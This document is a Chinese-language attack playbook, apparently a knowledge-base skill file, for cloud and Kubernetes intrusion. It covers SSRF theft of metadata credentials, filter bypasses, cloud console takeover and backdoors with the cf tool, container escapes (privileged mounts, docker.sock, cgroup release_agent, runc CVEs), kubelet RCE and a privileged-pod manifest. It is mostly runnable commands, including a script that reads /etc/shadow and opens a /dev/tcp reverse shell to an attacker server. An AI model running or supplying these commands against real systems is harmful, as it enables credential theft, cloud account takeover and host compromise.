---
name: kb-cloud-security-container
description: 云安全与容器逃逸实战手册——SSRF→元数据→AK/SK→云上资产接管，及容器/K8s 逃逸与横移全链路命令
tags: [云安全, 容器逃逸, K8s, AK利用, 云上提权]
date: 2026-08-14
---
# 云安全与容器逃逸实战手册（2026）

> 读者：Web 渗透熟练，有 SSRF 拿云元数据 AK/SK 经验，缺"拿到 AK 之后"与容器/K8s 侧。补两条链：① SSRF→元数据→AK/SK→cf 接管；② 容器/集群内逃逸与横移。命令可直接执行。仅限授权测试。

## 0. 核心攻击链
```
链A  Web SSRF → 云元数据 → 临时AK/SK/Token → cf配置 → perm判权 → ls枚举 → console接管/ECS执行/存储桶拖数据
链B  Web RCE → 容器内 → 逃逸(privileged/socket/cgroup/runc CVE) → Node root → 云实例身份 → 元数据 → AK/SK → 云上横移
链C  K8s未授权(6443/10250/2379/Dashboard) → SA token → RBAC滥用 → 建特权Pod → Node → 集群接管 → 云身份
```
## 1. 云元数据 SSRF 深化
### 1.1 各云元数据端点全清单
| 云厂商 | 地址 | 凭据端点 | 防护 |
|---|---|---|---|
| 阿里云 | `100.100.100.200` | `/latest/meta-data/ram/security-credentials/<role>` | 加固模式需 PUT 换 Token |
| 腾讯云 | `metadata.tencentyun.com` | `/latest/meta-data/cam/security-credentials/<role>` | **无防护，SSRF 直读** |
| AWS | `169.254.169.254` | `/latest/meta-data/iam/security-credentials/<role>` | IMDSv2 需 PUT Token |
| Azure | `169.254.169.254` | `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | 需 `Metadata: true` 头 |
| GCP | `metadata.google.internal` | `/computeMetadata/v1/instance/service-accounts/default/token` | 需 `Metadata-Flavor: Google` 头 |
| 华为云 | `169.254.169.254` | `/openstack/latest/security-credentials` | 需 Metadata 头 |
### 1.2 阿里云凭据提取
```bash
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/   # 列角色名
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>  # 直接读(未开加固)
TOKEN=$(curl -s -X PUT http://100.100.100.200/latest/api/token -H "X-aliyun-ecs-metadata-token-ttl-seconds: 180")  # 加固模式:先PUT换Token
curl -s -H "X-aliyun-ecs-metadata-token: $TOKEN" http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>
```
返回 `AccessKeyId/AccessKeySecret/SecurityToken/Expiration`。404=未绑 RAM 角色换点；经典网络不支持实例角色。
### 1.3 腾讯云凭据提取
```bash
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/  # 列角色名,无角色404
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role>
# 返回 TmpSecretId/TmpSecretKey/Token/ExpiredTime；腾讯元数据无 IMDSv2 类防护，SSRF 直读最顺
```
### 1.4 AWS 凭据提取 + IMDSv2
```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/     # IMDSv1 直读
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
curl -s http://169.254.169.254/latest/user-data/    # 可能藏 SSH key/配置
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")  # IMDSv2
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# EKS IRSA: env 里 AWS_ROLE_ARN + AWS_WEB_IDENTITY_TOKEN_FILE，token 在 /var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
### 1.5 IMDSv2 绕过（2024-2026 实测）
- **本质**：IMDSv2 会话型（PUT 拿 token），多数 SSRF 只会 GET 过不了 PUT。Pandoc CVE-2025-51591（iframe src 渲染拉 URL）实弹：IMDSv2-only 全 401 失败，**成功案例全是 `HttpTokens=optional`（IMDSv1 仍开）**。
- 绕过优先级：**先试 IMDSv1 直读**（存量实例大量未强制 v2）→ 再试 SSRF 变体发 PUT → 无果放弃。探测：GET 返回角色名或 404（非 401）= v1 可用。
### 1.6 SSRF 过滤绕过（169.254.169.254 / 127.0.0.1 被封时）
```
十进制 http://2130706433   十六进制 http://0x7f000001   八进制 http://0177.0.0.1
IPv6 http://[::1] / [::ffff:127.0.0.1]   短写 http://127.1   DNS重绑定 http://127.0.0.1.nip.io
URL/十六进制编码   协议 file:// gopher://(打Redis) dict://   302重定向跳元数据
阿里换 100.100.100.200/202(DNS)/203(NTP) 别名
```
## 2. AK/SK 利用全链路（cf 为主）
### 2.1 cf 安装与配置
```bash
# TeamSSF/TeamsSix 出品；2023-08 转私有，开源止步 v0.5.0，GitHub 有镜像
brew tap teamssix/tap && brew install teamssix/tap/cf     # 或 github.com/teamssix/cf/releases 下二进制
cf config                        # 交互配置 AK/SK/可选 STS Token；缓存 ~/.config/cf/cache.db
cf config ls -a / sw / scan / del   # 查看全部/切换/扫本机配置自动识别/删除
cf config query -a <AK_ID> -s <SK> -t <TOKEN>   # 识别厂商+校验可用性
```
自动识别源：阿里 `~/.aliyun/config.json` + `ALIBABACLOUD_ACCESS_KEY_ID/SECRET/SECURITY_TOKEN`；腾讯 `~/.tccli/*.credential` + `TENCENTCLOUD_SECRET_ID/SECRET_KEY`。
### 2.2 阿里云利用
```bash
cf alibaba perm                  # ★第一步判权
cf alibaba ls                    # 枚举 ECS/OSS/RDS/SLB/域名
cf alibaba console               # ★接管Web控制台(默认建用户 crossfire，-u 指定更隐蔽)；console cancel 取消
cf alibaba ecs exec -b           # ★批量所有ECS执行三要素(whoami/id/hostname/ifconfig)
cf alibaba ecs exec -c "id"      # 指定命令；-f cmd.sh 指定文件
cf alibaba ecs exec -m           # ★获取实例内临时凭证(实例RAM角色STS)
cf alibaba oss ls / oss obj ls <bucket> / oss obj get <bucket> <key> [path]
cf alibaba rds account           # 一键创建 RDS 账号
cf alibaba vpc ls / cfr          # VPC安全组拓扑 / 云函数FC列表(可做后门)
```
> 蓝队标志：控制台出现 `crossfire` 用户即疑似 cf 攻击。
### 2.3 腾讯云利用
```bash
cf tencent perm / ls / console          # 判权/枚举/接管
cf tencent cvm exec -b / -c "cmd" / -m  # CVM 批量执行/指定命令/取临时凭证
cf tencent cos ls / cos obj get         # COS 存储桶
cf tencent vpc ls                       # 已知有效
```
腾讯子命令与阿里一一对应(cvm≈ecs, cos≈oss)，不确定 `cf tencent <子> -h`。
### 2.4 AWS 利用
```bash
cf aws perm / ls / console
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...   # awscli 手工
aws sts get-caller-identity
aws iam list-users && aws iam list-attached-user-policies --user-name <name>
aws ec2 describe-instances --region us-east-1
aws s3 ls && aws s3 ls s3://<bucket> --no-sign-request    # 匿名桶
aws secretsmanager list-secrets --region <region>
```
### 2.5 云厂商原生工具
- **AliyunAccessKeyTools**（`github.com/mryunpeng/aliyun-accesskey-tools`）：阿里 AK 细粒度操作（OSS/ECS/控制台/RDS）。
- **enumerate-iam**：AWS 权限爆破 `enumerate-iam --access-key <AK> --secret-key <SK>`。
- **cloudfox / pacu / ScoutSuite**：AWS 枚举/自动提权链（`iam:PassRole`+lambda/ec2/glue 等 18+ 条）。
- **Azure**：roadtools(roadrecon dump 租户)、GraphRunner、AADInternals。
### 2.6 存储桶配置错误
```bash
curl -s http://<bucket>.oss-<region>.aliyuncs.com/          # OSS 匿名列举
curl -s http://<bucket>.cos.<region>.myqcloud.com/          # COS 列举
aws s3 ls s3://<bucket> --no-sign-request                   # S3
curl -s -X PUT -d test http://<bucket>.oss-<region>.aliyuncs.com/test.txt   # 匿名写测试
```
判定门槛：能列出**真实对象**、能上传、影响真实业务文件。空列表/403 不算。
### 2.7 ECS/后门/提权
```bash
# 高权 AK 价值排序：控制台接管 → ECS exec 批量执行(直接RCE) → RDS建账号 → OSS拖数据 → RAM建后门
# RAM 提权：子账号有 AttachPolicyToUser/CreateAccessKey/CreateUser 即可自我提权到 admin
# 持久化：隐藏子用户+AdministratorAccess / 角色附加策略 / FC 后门(*.cn-<region>.fcapp.run)
# 铁律：先 perm 判权再按最小影响动作，避免触发告警封停；临时STS 1~6h 过期需续取
```
## 3. 容器逃逸
### 3.1 容器识别
```bash
cat /proc/1/cgroup 2>/dev/null | grep -qi "docker\|kubepods\|containerd" && echo IN
ls -la /.dockerenv 2>/dev/null; grep CapEff /proc/self/status   # 0000003fffffffff=特权
mount | grep overlay; cat /proc/1/status | head -5
```
### 3.2 privileged 逃逸（最高频）
```bash
fdisk -l 2>/dev/null || lsblk                    # 找宿主盘,通常 /dev/vda1
mkdir -p /mnt/host && mount /dev/vda1 /mnt/host && chroot /mnt/host bash   # ①挂宿主盘
nsenter --target 1 --mount --uts --ipc --net --pid -- bash                  # ②nsenter 进宿主 PID1
ls /proc/1/root/ && cat /proc/1/root/etc/shadow   # ③hostPID 共享时直读宿主 fs
```
### 3.3 Docker socket 挂载（/var/run/docker.sock）
```bash
ls -la /var/run/docker.sock
docker run -v /:/host --privileged -it alpine chroot /host bash   # 有 docker CLI
# 无 CLI 纯 curl：
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["/bin/sh"],"Tty":true,"OpenStdin":true,"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<cid>/start
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<cid>/exec -H "Content-Type: application/json" -d '{"Cmd":["chroot","/host","bash"]}'
```
### 3.4 cgroup v1 release_agent（需 CAP_SYS_ADMIN）
```bash
d=$(dirname "$(ls -x /s*/fs/c*/*/r* | head -n1)")   # 定位可写 cgroup
mkdir -p $d/w && echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\bperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output   # 或反弹: bash -i >& /dev/tcp/<your-attack-server>/4444 0>&1
EOF
chmod +x /cmd; sh -c "echo \$\$ > $d/w/cgroup.procs"; sleep 1; cat /output
```
cgroup v2 无 release_agent，此招失效。
### 3.5 CVE-2022-0492（unshare 免 CAP_SYS_ADMIN）
```bash
# 内核 2.6.24-rc1~5.17-rc2；unshare 新建用户命名空间即得 CAP_SYS_ADMIN
# 前提：容器 root + cgroup v1 + seccomp/AppArmor/SELinux 放行
unshare -UrmC bash
mkdir -p /mnt/cgroup && mount -t cgroup -o rdma cgroup /mnt/cgroup
mkdir -p /mnt/cgroup/x && echo 1 > /mnt/cgroup/x/notify_on_release
echo '/path/to/mal.sh' > /mnt/cgroup/x/release_agent   # 该 cgroup 进程全退出→宿主 root 执行
```
Docker 默认 AppArmor+Seccomp 会拦；特权/宽松 securityContext 的 K8s Pod 才可打。
### 3.6 runc CVE 系（2019 / 2024 / 2025）
```bash
# CVE-2019-5736: runc<1.0.0-rc6，容器内 /bin/sh 换 exploit，宿主下次 exec/start 覆写 /usr/bin/runc → 宿主 root (PoC: github.com/Frichetten/CVE-2019-5736-PoC)
# CVE-2024-21626 "Leaky Vessels"(8.6): runc 1.0.0-rc93~1.1.11，宿主 fd 泄露进容器 init，切 cwd 到 /proc/self/fd/<N> 继承宿主 cwd 绕过 mount ns
for i in /proc/self/fd/*; do [ -d $i ] && ls -l $i; done   # 探测泄露 fd；修复: runc 1.1.12
# CVE-2025-31133/52565/52881(2025-11-05): 恶意镜像/RUN --mount=/volumeMounts 触发，可覆写宿主 /proc/sys、/proc/sysrq-trigger 达成 breakout
#   31133=maskedPaths TOCTOU，52565=/dev/console 穿越，52881=LSM 标签缺陷；受影响 runc≤1.2.7/1.3.2，修复 1.2.8/1.3.3
```
### 3.7 挂宿主目录 / 内核洞
```bash
# hostPath 或 -v / 挂宿主根：chroot /host bash；只挂 /var/run→docker.sock 回 §3.3；只挂 /etc→shadow/ssh key
# 内核洞共享宿主内核：Dirty Pipe CVE-2022-0847(5.8+) 容器内覆写只读文件可提权
uname -a; cat /etc/os-release   # 对照已知可打内核洞
```
### 3.8 逃逸工具与决策
```bash
./cdk evaluate            # CDK 一键评估 caps/挂载/权限给建议
./cdk run sh-xxx          # 自动跑指定逃逸链
./deepce.sh / ./botb -autopwn / ./peirates
```
决策树：特权?→挂盘/nsenter；socket?→建特权容器；CAP_SYS_ADMIN+cgroup v1→release_agent；runtime 老→对应 CVE；都不满足→内核洞→可写宿主挂载→枚举网络找其他容器。
## 4. K8s 渗透
### 4.1 API Server 未授权
```bash
curl -sk https://<APISERVER>:6443/version
curl -sk https://<APISERVER>:6443/api/v1/namespaces     # 匿名可列=未授权
curl -sk http://<APISERVER>:8080/api/v1/namespaces       # legacy 无认证
kubectl get pods --insecure-skip-tls-verify --server https://<APISERVER>:6443
```
### 4.2 从 Pod 内开始（SA token）
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/$NS/pods
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool   # 解码 JWT 看身份
```
### 4.3 Kubelet 10250 未授权（经典 RCE）
```bash
curl -sk https://<NODE_IP>:10250/pods                     # 列运行 Pod
curl -sk -X POST "https://<NODE_IP>:10250/run/<ns>/<pod>/<container>" -d "cmd=id"   # /run 直接回显
curl -sk -X POST "https://<NODE_IP>:10250/run/kube-system/etcd-0/etcd" -d "cmd=env"
websocat --insecure --header "Authorization: Bearer $TOKEN" --protocol v4.channel.k8s.io \
  "wss://<NODE_IP>:10250/exec/<ns>/<pod>/<container>?output=1&error=1&command=id"   # /exec 走 WS
curl -s http://<NODE_IP>:10255/pods    # 10255 只读 HTTP，仅信息泄露
```
**2026 nodes/proxy GET 姿势**：Kubelet 只校验 WS 握手 GET（get 动词），对 /exec /run 所需 create 不二次校验 → 有 `nodes/proxy` get 权限即可任意 Pod RCE 且**无审计日志**；官方认定"按预期"需 KEP-2862(v1.33) 修。检查：`kubectl auth can-i get nodes --subresource=proxy`。
### 4.4 RBAC 滥用
```bash
kubectl auth can-i --list && kubectl auth can-i create pods -n kube-system
kubectl auth can-i get secrets --all-namespaces
kubectl get clusterroles -o json | grep -B1 -A3 '"resources": \["\*"\]'
```
高危权限：`pods/exec`(进任意pod)、`pods` create(建特权pod)、`secrets` get/list、`serviceaccounts/token` create(铸造token)、`nodes/proxy`、`escalate`/`bind`/`impersonate`(自提权)。
### 4.5 建特权 Pod 逃逸到节点
```bash
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata: { name: privesc }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n -p -- /bin/bash"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: hostfs, mountPath: /host }]
  volumes: [{ name: hostfs, hostPath: { path: / }}]
EOF
kubectl exec -it privesc -- /bin/bash
kubectl create token admin-sa -n kube-system --duration=87600h   # 有 serviceaccounts/token 权限时
```
### 4.6 etcd 直连 / Dashboard
```bash
curl -sk https://<ETCD_IP>:2379/version    # 匿名可达则 dump 全部 Secret(未开 EncryptionConfiguration 时明文)
# 有主节点证书：etcdctl --cacert=ca.crt --cert=server.crt --key=server.key get / --prefix --keys-only | grep secrets
# Dashboard(30000/30001 或独立域名)：旧版选 "Skip" 跳过登录，登录后 exec 任意容器/看 secrets
```
### 4.7 云上 K8s（ACK/TKE/EKS）特性
- **ACK(阿里)**：Pod 默认可达 `100.100.100.200`，直接打实例 RAM 角色（防护方案 kube2ram+iptables 代理）。逃逸到 Node→元数据→RAM STS→cf 接管。
- **TKE(腾讯)**：Node 挂 CVM 角色，逃逸后打 `metadata.tencentyun.com` 拿 CAM 临时密钥。
- **EKS(AWS)**：Node 有 NodeInstanceRole，逃逸后打 `169.254.169.254`；IRSA Pod 用 `AWS_WEB_IDENTITY_TOKEN_FILE`+`AWS_ROLE_ARN` 走 assume-role-with-web-identity。
- **GKE/AKS**：metadata.google.internal(带 Metadata-Flavor 头) / Azure IMDS `Metadata: true`(Managed Identity)。
- 共性：托管面 apiserver 通常限 IP，但 **Node 常带高权云角色 → 逃逸 Node 再打元数据是云 K8s 最高价值链**。
### 4.8 K8s 工具
```bash
kube-hunter --remote <target> / --pod       # 远程扫 / Pod 内自检
kubeletctl pods -s <NODE_IP>                # 专打 kubelet
peirates                                    # Pod 内交互渗透框架
kubescape scan --enable-host-scan           # 配置基线
```
## 5. 工具链速查
| 工具 | 用途 | 核心命令 |
|---|---|---|
| cf | 云AK利用(阿里/腾讯/AWS/华为) | `cf config`→`cf alibaba perm`→`ls`→`console`/`ecs exec -b`/`oss obj get` |
| AliyunAccessKeyTools | 阿里AK细粒度 | OSS/ECS/控制台/RDS |
| enumerate-iam | AWS权限爆破 | `enumerate-iam --access-key <AK> --secret-key <SK>` |
| cloudfox/pacu | AWS枚举/提权 | `cloudfox inventory` / `pacu` |
| awscli | AWS手工 | `aws sts get-caller-identity`/`aws s3 ls --no-sign-request` |
| CDK | 容器/K8s利用 | `cdk evaluate`/`cdk run sh-xxx` |
| deepce/botb | Docker自动逃逸 | `./deepce.sh`/`./botb -autopwn` |
| kube-hunter | K8s漏洞扫描 | `kube-hunter --remote <ip>` |
| kubeletctl | Kubelet利用 | `kubeletctl pods -s <ip>`/`run -s <ip> -p <pod> -c <c> "id"` |
| peirates | Pod内K8s渗透 | `./peirates` |
| websocat | /exec流式 | `websocat --protocol v4.channel.k8s.io "wss://<ip>:10250/exec/..."` |
## 6. 常见坑与绕过
1. **AK/SK 权限范围**：先 `cf alibaba perm`（或 `aliyun sts GetCallerIdentity`）判权。只读 AK 别硬拖，低权先找 RAM 提权点；临时 STS 1~6h 过期，提前续取。
2. **审计日志**：云厂商默认开 CloudTrail/ActionTrail，ECS exec/控制台接管留痕。优先"读"不"写"，控制台接管最显眼（crossfire 即标志）。
3. **元数据防护绕过**：阿里/腾讯默认直读无防护；AWS 强制 IMDSv2 后先试 v1（`HttpTokens=optional` 存量多），再试 PUT 变体。云 K8s 用 kube2ram/IRSA 隔离 Pod 侧，但 Node 侧仍可打。
4. **容器内无 root**：先容器内提权（SUID/sudo/内核洞），或 unshare 用户命名空间拿"伪 CAP_SYS_ADMIN"打 CVE-2022-0492 类——非 root 不代表不能逃逸。
5. **cgroup v2 + 默认 Seccomp**：现代内核默认 v2，Docker 默认 seccomp/AppArmor，老 release_agent 和 unshare 会失败，换 socket/privileged/CVE 面。
6. **元数据返回字段别搞混**：404=无角色非防护，401=防护；阿里 `AccessKeyId/AccessKeySecret/SecurityToken`，腾讯 `TmpSecretId/TmpSecretKey/Token`，AWS `AccessKeyId/SecretAccessKey/Token`。
## 7. 实战靶场与资源
| 靶场 | 覆盖 | 地址 |
|---|---|---|
| CloudGoat | AWS(ECS/EFS容器逃逸、SSRF、IAM提权) | github.com/RhinoSecurityLabs/cloudgoat |
| AWSGoat/AzureGoat/GCPGoat | 三大云脆弱环境 | github.com/ine-labs/AWSGoat 等 |
| TerraformGoat | **多云含阿里/腾讯云**(OSS ACL/ECS SSRF) | github.com/HXSecurity/TerraformGoat |
| Kubernetes Goat | 容器逃逸+K8s 配置漏洞 | github.com/madhuakula/kubernetes-goat |
| Iam Vulnerable | AWS IAM 提权练习 | github.com/BishopFox/iam-vulnerable |
| 火线云安全知识库 | 阿里/腾讯云攻防文章 | cloudsec.huoxian.cn |
## Sources
- CF 手册与仓库: https://wiki.teamssix.com/cf/ · https://github.com/GaoZzr/cf · https://github.com/teamssix/cf · 攻防演练云上初体验: https://cloud.tencent.com.cn/developer/article/2311060
- SSRF Exploitation / Cloud SSRF(HackTricks): https://payloadplayground.com/blog/ssrf-exploitation-cloud-metadata · https://hacktricks.wiki/zh/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html
- Pandoc CVE-2025-51591 与 IMDSv2: https://safeguard.sh/resources/blog/pandoc-ssrf-cve-2025-51591-ec2-iam-theft · AWS EC2 凭证窃取 via SSRF: https://www.hackingarticles.in/aws-ec2-credentials-theft-via-ssrf-abuse/
- Container Breakout 2024-2025 / runc CVE 汇总: https://safeguard.sh/resources/blog/container-breakout-class-vulnerabilities-2024-2025 · https://safeguard.sh/resources/blog/container-escape-vulnerabilities
- CVE-2025-31133 runc: https://safeguard.sh/resources/blog/runc-cve-2025-31133-patch-response · 阿里 ACK 修复: https://help.aliyun.com/en/ack/ack-edge/support/cve-2025-31133-cve-2025-52565-and-cve-2025-52881-fixes
- CVE-2022-0492: https://www.sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig · https://safeguard.sh/resources/blog/linux-cgroups-releaseagent-container-escape-cve-2022-0492
- Kubelet 10250 未授权: https://securityboulevard.com/2019/01/kubernetes-unauth-kublet-api-10250-token-theft-kubectl/ · nodes/proxy GET 滥用(FreeBuf): https://www.freebuf.com/articles/web/469125.html
- kube-hunter: https://github.com/aquasecurity/kube-hunter · 阿里云 ECS 攻防剖析: https://cn-sec.com/archives/4294863.html
- 腾讯云 CVM 攻防(火线): https://cloudsec.huoxian.cn/docs/articles/tencentcloud/tencent_cvm · 腾讯云元数据/CAM(SDK): https://github.com/TencentCloud/tencentcloud-sdk-go-intl-en/blob/v3.0.1315/tencentcloud/common/cvm_role_provider.go
- CloudGoat/TerraformGoat/Kubernetes Goat: https://github.com/RhinoSecurityLabs/cloudgoat · https://github.com/HXSecurity/TerraformGoat · https://github.com/madhuakula/kubernetes-goat
